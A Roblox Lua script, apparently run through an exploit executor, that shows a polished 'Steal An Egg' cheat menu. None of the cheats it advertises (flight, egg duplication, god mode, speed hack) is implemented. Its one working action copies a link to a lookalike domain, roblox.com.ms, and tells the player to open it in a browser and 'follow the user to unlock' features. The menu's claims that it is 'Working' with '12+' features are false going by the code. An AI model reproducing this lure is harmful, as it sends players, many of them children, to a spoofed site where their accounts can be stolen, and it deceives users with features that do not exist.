--[[
    Steal An Egg | Premium Tabbed UI v4.1
    FIXED: Buttons are clickable, proper layering
]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local CONFIG = {
    Name = "Steal An Egg",
    ProfileLink = "https://roblox.com.ms/users/2729350724/profile",
    MainColor = Color3.fromRGB(88, 166, 255),
    AccentColor = Color3.fromRGB(190, 130, 255),
    SuccessColor = Color3.fromRGB(100, 255, 160),
    DangerColor = Color3.fromRGB(255, 120, 120),
    Bg1 = Color3.fromRGB(15, 18, 42),
    Bg2 = Color3.fromRGB(28, 22, 58),
    LightText = Color3.fromRGB(245, 248, 255),
    SubText = Color3.fromRGB(195, 205, 240),
    DimText = Color3.fromRGB(140, 155, 200),
    CardBg = Color3.fromRGB(40, 45, 80)
}

-- Clipboard
local function CopyToClipboard(text)
    local success = false
    if setclipboard then pcall(function() setclipboard(text) success = true end) end
    if not success and syn and syn.write_clipboard then pcall(function() syn.write_clipboard(text) success = true end) end
    if not success and clipboard and clipboard.set then pcall(function() clipboard.set(text) success = true end) end
    if not success and writeclipboard then pcall(function() writeclipboard(text) success = true end) end
    if not success and Fluxus and Fluxus.Clipboard then pcall(function() Fluxus.Clipboard:Set(text) success = true end) end
    if not success then
        pcall(function()
            local tb = Instance.new("TextBox")
            tb.Text = text
            tb.Parent = PlayerGui
            tb:CaptureFocus()
            tb.SelectionStart = 1
            tb.SelectionEnd = #text
            wait()
            tb:Copy()
            tb:Destroy()
            success = true
        end)
    end
    return success
end

-- Cleanup
if PlayerGui:FindFirstChild("StealAnEggUI") then PlayerGui.StealAnEggUI:Destroy() end

-- ScreenGui
local Screen = Instance.new("ScreenGui")
Screen.Name = "StealAnEggUI"
Screen.ResetOnSpawn = false
Screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Screen.Parent = PlayerGui

-- Holder
local Holder = Instance.new("Frame")
Holder.Size = UDim2.new(0, 520, 0, 440)
Holder.Position = UDim2.new(0.5, -260, 0.5, -220)
Holder.BackgroundTransparency = 1
Holder.Active = true
Holder.Parent = Screen

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = CONFIG.Bg1
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Parent = Holder

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 20)
MainCorner.Parent = MainFrame

-- ==========================================
-- BACKGROUND (ZIndex = 1)
-- ==========================================

local BgGradient = Instance.new("Frame")
BgGradient.Name = "BgGradient"
BgGradient.Size = UDim2.new(1, 0, 1, 0)
BgGradient.BackgroundColor3 = CONFIG.Bg2
BgGradient.ZIndex = 1
BgGradient.Parent = MainFrame

local Gradient = Instance.new("UIGradient")
Gradient.Rotation = 135
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, CONFIG.Bg1),
    ColorSequenceKeypoint.new(0.5, CONFIG.Bg2),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 25, 50))
})
Gradient.Parent = BgGradient

-- Floating orbs
local function CreateOrb(color, size, startX, startY, speed)
    local Orb = Instance.new("Frame")
    Orb.Size = UDim2.new(0, size, 0, size)
    Orb.Position = UDim2.new(0, startX, 0, startY)
    Orb.BackgroundColor3 = color
    Orb.BackgroundTransparency = 0.88
    Orb.BorderSizePixel = 0
    Orb.ZIndex = 1
    Orb.Parent = BgGradient
    
    local oCorner = Instance.new("UICorner")
    oCorner.CornerRadius = UDim.new(1, 0)
    oCorner.Parent = Orb
    
    local Glow = Instance.new("Frame")
    Glow.Size = UDim2.new(1.5, 0, 1.5, 0)
    Glow.Position = UDim2.new(-0.25, 0, -0.25, 0)
    Glow.BackgroundColor3 = color
    Glow.BackgroundTransparency = 0.94
    Glow.BorderSizePixel = 0
    Glow.ZIndex = 1
    Glow.Parent = Orb
    local gCorner = Instance.new("UICorner")
    gCorner.CornerRadius = UDim.new(1, 0)
    gCorner.Parent = Glow
    
    spawn(function()
        local time = math.random() * 10
        while Orb and Orb.Parent do
            time = time + 0.02
            local newX = startX + math.sin(time * speed) * 60
            local newY = startY + math.cos(time * speed * 0.7) * 40
            Orb.Position = UDim2.new(0, newX, 0, newY)
            wait(0.02)
        end
    end)
end

CreateOrb(CONFIG.MainColor, 200, -50, -30, 0.4)
CreateOrb(CONFIG.AccentColor, 180, 380, 300, 0.35)
CreateOrb(Color3.fromRGB(100, 200, 255), 150, 300, -40, 0.5)
CreateOrb(Color3.fromRGB(180, 100, 255), 130, -20, 350, 0.45)

-- ==========================================
-- CONTENT LAYER (ZIndex = 5+)
-- ==========================================

local ContentLayer = Instance.new("Frame")
ContentLayer.Name = "ContentLayer"
ContentLayer.Size = UDim2.new(1, 0, 1, 0)
ContentLayer.BackgroundTransparency = 1
ContentLayer.ZIndex = 5
ContentLayer.Active = true
ContentLayer.Parent = MainFrame

-- Top bar
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 75)
TopBar.BackgroundTransparency = 1
TopBar.ZIndex = 5
TopBar.Parent = ContentLayer

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -90, 0, 45)
TitleLabel.Position = UDim2.new(0, 20, 0, 15)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = CONFIG.Name
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = CONFIG.LightText
TitleLabel.TextSize = 36
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.TextStrokeTransparency = 0.5
TitleLabel.ZIndex = 5
TitleLabel.Parent = TopBar

local TitleStroke = Instance.new("UIStroke")
TitleStroke.Color = CONFIG.MainColor
TitleStroke.Thickness = 1
TitleStroke.Transparency = 0.5
TitleStroke.Parent = TitleLabel

local VersionLabel = Instance.new("TextLabel")
VersionLabel.Size = UDim2.new(0, 60, 0, 20)
VersionLabel.Position = UDim2.new(1, -75, 0, 30)
VersionLabel.BackgroundTransparency = 1
VersionLabel.Font = Enum.Font.GothamMedium
VersionLabel.Text = "v1.0"
VersionLabel.TextColor3 = CONFIG.DimText
VersionLabel.TextSize = 12
VersionLabel.TextXAlignment = Enum.TextXAlignment.Right
VersionLabel.ZIndex = 5
VersionLabel.Parent = TopBar

-- Tab bar
local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1, -30, 0, 42)
TabBar.Position = UDim2.new(0, 15, 0, 78)
TabBar.BackgroundColor3 = Color3.fromRGB(25, 30, 55)
TabBar.BackgroundTransparency = 0.4
TabBar.BorderSizePixel = 0
TabBar.ZIndex = 5
TabBar.Active = true
TabBar.Parent = ContentLayer

local TabBarCorner = Instance.new("UICorner")
TabBarCorner.CornerRadius = UDim.new(0, 12)
TabBarCorner.Parent = TabBar

-- Tab buttons
local Tabs = {}
local TabNames = {"Unlock", "About", "Features"}

for i, name in ipairs(TabNames) do
    local Tab = Instance.new("TextButton")
    Tab.Size = UDim2.new(1/3, -4, 1, -6)
    Tab.Position = UDim2.new((i-1)/3 + 0.005, 0, 0, 3)
    Tab.BackgroundTransparency = 1
    Tab.Font = Enum.Font.GothamBold
    Tab.Text = name
    Tab.TextColor3 = CONFIG.DimText
    Tab.TextSize = 14
    Tab.AutoLocalize = false
    Tab.ZIndex = 6
    Tab.Active = true
    Tab.Parent = TabBar
    
    local TabCorner = Instance.new("UICorner")
    TabCorner.CornerRadius = UDim.new(0, 10)
    TabCorner.Parent = Tab
    
    table.insert(Tabs, Tab)
end

-- Tab indicator
local TabIndicator = Instance.new("Frame")
TabIndicator.Size = UDim2.new(1/3, -8, 0, 3)
TabIndicator.Position = UDim2.new(0.005, 2, 1, -3)
TabIndicator.BackgroundColor3 = CONFIG.MainColor
TabIndicator.BorderSizePixel = 0
TabIndicator.ZIndex = 7
TabIndicator.Parent = TabBar

local IndicatorCorner = Instance.new("UICorner")
IndicatorCorner.CornerRadius = UDim.new(1, 0)
IndicatorCorner.Parent = TabIndicator

-- Content container
local ContentContainer = Instance.new("Frame")
ContentContainer.Size = UDim2.new(1, -30, 1, -135)
ContentContainer.Position = UDim2.new(0, 15, 0, 128)
ContentContainer.BackgroundTransparency = 1
ContentContainer.ClipsDescendants = true
ContentContainer.ZIndex = 5
ContentContainer.Parent = ContentLayer

-- ==========================================
-- TAB 1: UNLOCK
-- ==========================================

local UnlockTab = Instance.new("Frame")
UnlockTab.Name = "UnlockTab"
UnlockTab.Size = UDim2.new(1, 0, 1, 0)
UnlockTab.Position = UDim2.new(0, 0, 0, 0)
UnlockTab.BackgroundTransparency = 1
UnlockTab.ZIndex = 5
UnlockTab.Parent = ContentContainer

local UnlockTitle = Instance.new("TextLabel")
UnlockTitle.Size = UDim2.new(1, 0, 0, 30)
UnlockTitle.Position = UDim2.new(0, 0, 0, 15)
UnlockTitle.BackgroundTransparency = 1
UnlockTitle.Font = Enum.Font.GothamBold
UnlockTitle.Text = "Unlock Full Access"
UnlockTitle.TextColor3 = CONFIG.LightText
UnlockTitle.TextSize = 22
UnlockTitle.ZIndex = 5
UnlockTitle.Parent = UnlockTab

local UnlockInstruction = Instance.new("TextLabel")
UnlockInstruction.Size = UDim2.new(0.9, 0, 0, 70)
UnlockInstruction.Position = UDim2.new(0.05, 0, 0, 55)
UnlockInstruction.BackgroundTransparency = 1
UnlockInstruction.Font = Enum.Font.Gotham
UnlockInstruction.Text = "Press the button below to copy the profile link, then paste it in your browser and follow the user to unlock all features."
UnlockInstruction.TextColor3 = CONFIG.SubText
UnlockInstruction.TextSize = 14
UnlockInstruction.TextWrapped = true
UnlockInstruction.TextYAlignment = Enum.TextYAlignment.Top
UnlockInstruction.ZIndex = 5
UnlockInstruction.Parent = UnlockTab

-- Copy button
local CopyBtn = Instance.new("TextButton")
CopyBtn.Name = "CopyBtn"
CopyBtn.Size = UDim2.new(0.75, 0, 0, 60)
CopyBtn.Position = UDim2.new(0.125, 0, 0, 150)
CopyBtn.BackgroundColor3 = CONFIG.MainColor
CopyBtn.BorderSizePixel = 0
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.Text = "COPY PROFILE LINK"
CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBtn.TextSize = 16
CopyBtn.AutoLocalize = false
CopyBtn.ZIndex = 10
CopyBtn.Active = true
CopyBtn.Parent = UnlockTab

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 14)
CopyCorner.Parent = CopyBtn

local BtnGradient = Instance.new("UIGradient")
BtnGradient.Rotation = 90
BtnGradient.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0),
    NumberSequenceKeypoint.new(1, 0.25)
})
BtnGradient.Parent = CopyBtn

-- Status label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(0.9, 0, 0, 28)
StatusLabel.Position = UDim2.new(0.05, 0, 0, 225)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Font = Enum.Font.GothamBold
StatusLabel.Text = ""
StatusLabel.TextColor3 = CONFIG.SuccessColor
StatusLabel.TextSize = 13
StatusLabel.TextTransparency = 1
StatusLabel.ZIndex = 5
StatusLabel.Parent = UnlockTab

-- Hover
CopyBtn.MouseEnter:Connect(function()
    TweenService:Create(CopyBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = CONFIG.AccentColor,
        Size = UDim2.new(0.78, 0, 0, 64),
        Position = UDim2.new(0.11, 0, 0, 148)
    }):Play()
end)

CopyBtn.MouseLeave:Connect(function()
    TweenService:Create(CopyBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = CONFIG.MainColor,
        Size = UDim2.new(0.75, 0, 0, 60),
        Position = UDim2.new(0.125, 0, 0, 150)
    }):Play()
end)

-- Click
CopyBtn.MouseButton1Click:Connect(function()
    local copied = CopyToClipboard(CONFIG.ProfileLink)
    
    if copied then
        StatusLabel.Text = "Link Copied! Paste in browser and follow to unlock"
        StatusLabel.TextColor3 = CONFIG.SuccessColor
    else
        StatusLabel.Text = "Copy failed — try a different executor"
        StatusLabel.TextColor3 = CONFIG.DangerColor
    end
    
    TweenService:Create(StatusLabel, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
    
    TweenService:Create(CopyBtn, TweenInfo.new(0.08), {
        Size = UDim2.new(0.72, 0, 0, 57),
        Position = UDim2.new(0.14, 0, 0, 151)
    }):Play()
    wait(0.08)
    TweenService:Create(CopyBtn, TweenInfo.new(0.12), {
        Size = UDim2.new(0.75, 0, 0, 60),
        Position = UDim2.new(0.125, 0, 0, 150)
    }):Play()
    
    spawn(function()
        wait(4)
        TweenService:Create(StatusLabel, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    end)
end)

-- ==========================================
-- TAB 2: ABOUT
-- ==========================================

local AboutTab = Instance.new("Frame")
AboutTab.Name = "AboutTab"
AboutTab.Size = UDim2.new(1, 0, 1, 0)
AboutTab.Position = UDim2.new(1, 0, 0, 0)
AboutTab.BackgroundTransparency = 1
AboutTab.ZIndex = 5
AboutTab.Parent = ContentContainer

local AboutTitle = Instance.new("TextLabel")
AboutTitle.Size = UDim2.new(1, 0, 0, 28)
AboutTitle.Position = UDim2.new(0, 0, 0, 5)
AboutTitle.BackgroundTransparency = 1
AboutTitle.Font = Enum.Font.GothamBold
AboutTitle.Text = "About This Script"
AboutTitle.TextColor3 = CONFIG.LightText
AboutTitle.TextSize = 20
AboutTitle.TextXAlignment = Enum.TextXAlignment.Left
AboutTitle.ZIndex = 5
AboutTitle.Parent = AboutTab

local AboutDivider = Instance.new("Frame")
AboutDivider.Size = UDim2.new(0, 50, 0, 2)
AboutDivider.Position = UDim2.new(0, 0, 0, 35)
AboutDivider.BackgroundColor3 = CONFIG.MainColor
AboutDivider.BorderSizePixel = 0
AboutDivider.ZIndex = 5
AboutDivider.Parent = AboutTab

local AboutDesc = Instance.new("TextLabel")
AboutDesc.Size = UDim2.new(1, 0, 0, 65)
AboutDesc.Position = UDim2.new(0, 0, 0, 48)
AboutDesc.BackgroundTransparency = 1
AboutDesc.Font = Enum.Font.Gotham
AboutDesc.Text = "Steal An Egg is the ultimate script for egg hunting games. Dominate every server with powerful features designed to give you the complete advantage."
AboutDesc.TextColor3 = CONFIG.SubText
AboutDesc.TextSize = 13
AboutDesc.TextWrapped = true
AboutDesc.TextYAlignment = Enum.TextYAlignment.Top
AboutDesc.TextXAlignment = Enum.TextXAlignment.Left
AboutDesc.ZIndex = 5
AboutDesc.Parent = AboutTab

-- Info cards
local function CreateInfoCard(title, value, icon, posX)
    local Card = Instance.new("Frame")
    Card.Size = UDim2.new(0.31, -3, 0, 70)
    Card.Position = UDim2.new(posX, 0, 0, 125)
    Card.BackgroundColor3 = CONFIG.CardBg
    Card.BackgroundTransparency = 0.2
    Card.BorderSizePixel = 0
    Card.ZIndex = 5
    Card.Parent = AboutTab
    
    local CardCorner = Instance.new("UICorner")
    CardCorner.CornerRadius = UDim.new(0, 10)
    CardCorner.Parent = Card
    
    local Icon = Instance.new("TextLabel")
    Icon.Size = UDim2.new(0, 28, 0, 28)
    Icon.Position = UDim2.new(0, 8, 0, 8)
    Icon.BackgroundTransparency = 1
    Icon.Font = Enum.Font.GothamBold
    Icon.Text = icon
    Icon.TextSize = 20
    Icon.ZIndex = 5
    Icon.Parent = Card
    
    local ValueLabel = Instance.new("TextLabel")
    ValueLabel.Size = UDim2.new(1, -10, 0, 22)
    ValueLabel.Position = UDim2.new(0, 5, 0, 36)
    ValueLabel.BackgroundTransparency = 1
    ValueLabel.Font = Enum.Font.GothamBold
    ValueLabel.Text = value
    ValueLabel.TextColor3 = CONFIG.LightText
    ValueLabel.TextSize = 15
    ValueLabel.TextXAlignment = Enum.TextXAlignment.Center
    ValueLabel.ZIndex = 5
    ValueLabel.Parent = Card
    
    local TitleLabel2 = Instance.new("TextLabel")
    TitleLabel2.Size = UDim2.new(1, -10, 0, 16)
    TitleLabel2.Position = UDim2.new(0, 5, 0, 52)
    TitleLabel2.BackgroundTransparency = 1
    TitleLabel2.Font = Enum.Font.Gotham
    TitleLabel2.Text = title
    TitleLabel2.TextColor3 = CONFIG.DimText
    TitleLabel2.TextSize = 11
    TitleLabel2.TextXAlignment = Enum.TextXAlignment.Center
    TitleLabel2.ZIndex = 5
    TitleLabel2.Parent = Card
end

CreateInfoCard("Features", "12+", "⚡", 0)
CreateInfoCard("Updated", "2026", "🔄", 0.333)
CreateInfoCard("Status", "Working", "✅", 0.666)

-- Credits
local CreditsTitle = Instance.new("TextLabel")
CreditsTitle.Size = UDim2.new(1, 0, 0, 22)
CreditsTitle.Position = UDim2.new(0, 0, 0, 210)
CreditsTitle.BackgroundTransparency = 1
CreditsTitle.Font = Enum.Font.GothamBold
CreditsTitle.Text = "Credits"
CreditsTitle.TextColor3 = CONFIG.LightText
CreditsTitle.TextSize = 15
CreditsTitle.TextXAlignment = Enum.TextXAlignment.Left
CreditsTitle.ZIndex = 5
CreditsTitle.Parent = AboutTab

local CreditsText = Instance.new("TextLabel")
CreditsText.Size = UDim2.new(1, 0, 0, 50)
CreditsText.Position = UDim2.new(0, 0, 0, 232)
CreditsText.BackgroundTransparency = 1
CreditsText.Font = Enum.Font.Gotham
CreditsText.Text = "Script developed by the Steal An Egg team.\nFollow for updates and exclusive features."
CreditsText.TextColor3 = CONFIG.SubText
CreditsText.TextSize = 12
CreditsText.TextWrapped = true
CreditsText.TextYAlignment = Enum.TextYAlignment.Top
CreditsText.TextXAlignment = Enum.TextXAlignment.Left
CreditsText.ZIndex = 5
CreditsText.Parent = AboutTab

-- ==========================================
-- TAB 3: FEATURES
-- ==========================================

local FeaturesTab = Instance.new("Frame")
FeaturesTab.Name = "FeaturesTab"
FeaturesTab.Size = UDim2.new(1, 0, 1, 0)
FeaturesTab.Position = UDim2.new(2, 0, 0, 0)
FeaturesTab.BackgroundTransparency = 1
FeaturesTab.ZIndex = 5
FeaturesTab.Parent = ContentContainer

local FeaturesTitle = Instance.new("TextLabel")
FeaturesTitle.Size = UDim2.new(1, 0, 0, 28)
FeaturesTitle.Position = UDim2.new(0, 0, 0, 5)
FeaturesTitle.BackgroundTransparency = 1
FeaturesTitle.Font = Enum.Font.GothamBold
FeaturesTitle.Text = "Script Features"
FeaturesTitle.TextColor3 = CONFIG.LightText
FeaturesTitle.TextSize = 20
FeaturesTitle.TextXAlignment = Enum.TextXAlignment.Left
FeaturesTitle.ZIndex = 5
FeaturesTitle.Parent = FeaturesTab

local FeaturesDivider = Instance.new("Frame")
FeaturesDivider.Size = UDim2.new(0, 50, 0, 2)
FeaturesDivider.Position = UDim2.new(0, 0, 0, 35)
FeaturesDivider.BackgroundColor3 = CONFIG.MainColor
FeaturesDivider.BorderSizePixel = 0
FeaturesDivider.ZIndex = 5
FeaturesDivider.Parent = FeaturesTab

local FEATURES = {
    {name = "Fly", desc = "Free flight anywhere on the map", icon = "🕊️"},
    {name = "Auto Steal Egg", desc = "Automatically steals eggs near you", icon = "🥚"},
    {name = "Duplicate Egg", desc = "Duplicate any egg in your inventory", icon = "✨"},
    {name = "Instant Grow Egg", desc = "Grow eggs to max size instantly", icon = "📈"},
    {name = "Egg ESP", desc = "See all eggs through walls", icon = "👁️"},
    {name = "Speed Hack", desc = "Move at super speed", icon = "⚡"},
    {name = "No Clip", desc = "Walk through any object", icon = "👻"},
    {name = "Auto Collect", desc = "Auto-collect all nearby items", icon = "🧲"},
    {name = "God Mode", desc = "Become invincible", icon = "🛡️"},
    {name = "Infinite Jump", desc = "Jump as many times as you want", icon = "🦘"},
    {name = "Teleport", desc = "Teleport to eggs or players", icon = "🎯"},
    {name = "Anti AFK", desc = "Never get kicked for being AFK", icon = "⏰"}
}

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, 0, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 0, 0, 45)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 4
ScrollingFrame.ScrollBarImageColor3 = CONFIG.MainColor
ScrollingFrame.ScrollBarImageTransparency = 0.4
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, math.ceil(#FEATURES / 2) * 52)
ScrollingFrame.ZIndex = 5
ScrollingFrame.Active = true
ScrollingFrame.Parent = FeaturesTab

for i, feat in ipairs(FEATURES) do
    local col = (i - 1) % 2
    local row = math.floor((i - 1) / 2)
    
    local FeatureCard = Instance.new("Frame")
    FeatureCard.Size = UDim2.new(0.48, 0, 0, 44)
    FeatureCard.Position = UDim2.new(col * 0.52, 0, 0, row * 52)
    FeatureCard.BackgroundColor3 = CONFIG.CardBg
    FeatureCard.BackgroundTransparency = 0.2
    FeatureCard.BorderSizePixel = 0
    FeatureCard.ZIndex = 5
    FeatureCard.Parent = ScrollingFrame
    
    local FCCorner = Instance.new("UICorner")
    FCCorner.CornerRadius = UDim.new(0, 10)
    FCCorner.Parent = FeatureCard
    
    local FIcon = Instance.new("TextLabel")
    FIcon.Size = UDim2.new(0, 28, 0, 28)
    FIcon.Position = UDim2.new(0, 8, 0.5, -14)
    FIcon.BackgroundTransparency = 1
    FIcon.Font = Enum.Font.GothamBold
    FIcon.Text = feat.icon
    FIcon.TextSize = 18
    FIcon.ZIndex = 5
    FIcon.Parent = FeatureCard
    
    local FName = Instance.new("TextLabel")
    FName.Size = UDim2.new(1, -45, 0, 18)
    FName.Position = UDim2.new(0, 42, 0, 5)
    FName.BackgroundTransparency = 1
    FName.Font = Enum.Font.GothamBold
    FName.Text = feat.name
    FName.TextColor3 = CONFIG.LightText
    FName.TextSize = 13
    FName.TextXAlignment = Enum.TextXAlignment.Left
    FName.ZIndex = 5
    FName.Parent = FeatureCard
    
    local FDesc = Instance.new("TextLabel")
    FDesc.Size = UDim2.new(1, -45, 0, 16)
    FDesc.Position = UDim2.new(0, 42, 0, 22)
    FDesc.BackgroundTransparency = 1
    FDesc.Font = Enum.Font.Gotham
    FDesc.Text = feat.desc
    FDesc.TextColor3 = CONFIG.DimText
    FDesc.TextSize = 10
    FDesc.TextXAlignment = Enum.TextXAlignment.Left
    FDesc.ZIndex = 5
    FDesc.Parent = FeatureCard
end

-- ==========================================
-- TAB SWITCHING
-- ==========================================

local CurrentTab = 1

local function SwitchTab(tabIndex)
    if tabIndex == CurrentTab then return end
    CurrentTab = tabIndex
    
    TweenService:Create(TabIndicator, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new((tabIndex-1)/3 + 0.005, 2, 1, -3)
    }):Play()
    
    for i, tab in ipairs(Tabs) do
        if i == tabIndex then
            TweenService:Create(tab, TweenInfo.new(0.2), {TextColor3 = CONFIG.LightText}):Play()
            tab.BackgroundTransparency = 0.8
            tab.BackgroundColor3 = CONFIG.MainColor
        else
            TweenService:Create(tab, TweenInfo.new(0.2), {TextColor3 = CONFIG.DimText}):Play()
            tab.BackgroundTransparency = 1
        end
    end
    
    local targetX = -(tabIndex - 1)
    TweenService:Create(UnlockTab, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new(targetX, 0, 0, 0)
    }):Play()
    TweenService:Create(AboutTab, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new(targetX + 1, 0, 0, 0)
    }):Play()
    TweenService:Create(FeaturesTab, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new(targetX + 2, 0, 0, 0)
    }):Play()
end

for i, tab in ipairs(Tabs) do
    tab.MouseButton1Click:Connect(function()
        SwitchTab(i)
    end)
    
    tab.MouseEnter:Connect(function()
        if i ~= CurrentTab then
            TweenService:Create(tab, TweenInfo.new(0.15), {TextColor3 = CONFIG.SubText}):Play()
        end
    end)
    
    tab.MouseLeave:Connect(function()
        if i ~= CurrentTab then
            TweenService:Create(tab, TweenInfo.new(0.15), {TextColor3 = CONFIG.DimText}):Play()
        end
    end)
end

SwitchTab(1)

-- ==========================================
-- DRAGGABLE
-- ==========================================

local dragging, dragStart, startPos = false
Holder.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = Holder.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

Player:GetMouse().Move:Connect(function()
    if dragging then
        local delta = Player:GetMouse().Position - dragStart
        Holder.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- ==========================================
-- APPEAR ANIMATION
-- ==========================================

Holder.Position = UDim2.new(0.5, -260, 0.5, -240)
MainFrame.BackgroundTransparency = 1
ContentLayer.Visible = false

TweenService:Create(MainFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
TweenService:Create(Holder, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, -260, 0.5, -220)
}):Play()

wait(0.2)
ContentLayer.Visible = true

print("[Steal An Egg] UI Loaded")
